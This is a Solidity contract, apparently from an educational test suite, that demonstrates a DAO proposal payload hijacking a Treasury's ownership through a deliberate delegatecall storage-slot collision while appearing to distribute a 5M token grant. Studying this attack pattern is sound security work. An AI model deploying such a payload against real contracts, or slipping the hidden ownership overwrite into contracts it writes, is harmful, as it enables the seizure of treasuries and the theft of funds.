// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {MockToken} from "../MockToken.sol";

/**
 * @title MaliciousPayload
 * @notice UNSAFE EDUCATIONAL DEMONSTRATION ONLY.
 *
 * This contract demonstrates how an ostensibly standard DAO proposal grant payload
 * can silently seize contract ownership if executed via `delegatecall`.
 *
 * STORAGE LAYOUT COMPATIBILITY EXPLANATION:
 * The EVM maps Solidity state variables to consecutive 32-byte storage slots starting at index 0.
 *
 * Treasury Storage:
 * - Slot 0: address public owner
 * - Slot 1: address public token
 *
 * MaliciousPayload Storage:
 * - Slot 0: address public hijackedOwner (intentionally aligns with Treasury.owner)
 * - Slot 1: address public preservedToken (intentionally aligns with Treasury.token)
 *
 * DELEGATECALL EXECUTION MECHANISM:
 * When Treasury invokes `executeDelegateCall(address(maliciousPayload), data)`:
 * 1. Execution runs in the context of the Treasury (`address(this) == Treasury`).
 * 2. Any write to `hijackedOwner` modifies Slot 0 of `Treasury`, silently overwriting `Treasury.owner`!
 * 3. The 5M token transfer executes using Treasury's token balance.
 *
 * NORMAL CALL EXECUTION MECHANISM:
 * When Treasury invokes `executeCall(address(maliciousPayload), 0, data)`:
 * 1. Execution runs in the context of `MaliciousPayload` (`address(this) == MaliciousPayload`).
 * 2. Writes to `hijackedOwner` only modify Slot 0 of `MaliciousPayload`'s own storage.
 * 3. Treasury storage is completely isolated by the EVM calling boundary.
 * 4. The token transfer fails because `MaliciousPayload` has zero tokens, bubbling a revert.
 */
contract MaliciousPayload {
    // Intentional storage collision layout:
    // Slot 0: Aligns with Treasury.owner in delegatecall context
    address public hijackedOwner;
    // Slot 1: Aligns with Treasury.token in delegatecall context
    address public preservedToken;

    uint256 public constant GRANT_AMOUNT = 5_000_000 * 10**18;

    event MaliciousGrantDistributed(address indexed token, address indexed recipient, uint256 amount);
    event OwnershipHijackAttempted(address indexed attacker);

    error InvalidRecipientAddress();
    error InvalidAttackerAddress();
    error InvalidTokenAddress();
    error TransferFailed();

    /**
     * @notice Executes the 5M token grant AND hijacks Treasury ownership (if delegatecalled).
     * @param tokenAddress The ERC-20 token contract.
     * @param recipient The legitimate-looking grant beneficiary.
     * @param attacker The address designated to hijack Treasury ownership.
     */
    function execute(address tokenAddress, address recipient, address attacker) external {
        if (recipient == address(0)) revert InvalidRecipientAddress();
        if (attacker == address(0)) revert InvalidAttackerAddress();
        if (tokenAddress == address(0)) revert InvalidTokenAddress();

        // Step 1: Honest-looking token distribution
        bool success = MockToken(tokenAddress).transfer(recipient, GRANT_AMOUNT);
        if (!success) revert TransferFailed();
        emit MaliciousGrantDistributed(tokenAddress, recipient, GRANT_AMOUNT);

        // Step 2: Unsafe storage manipulation
        // In delegatecall context: writes directly to Treasury.owner (Slot 0).
        // In call context: writes only to MaliciousPayload.hijackedOwner (Slot 0 of this contract).
        hijackedOwner = attacker;
        emit OwnershipHijackAttempted(attacker);
    }
}
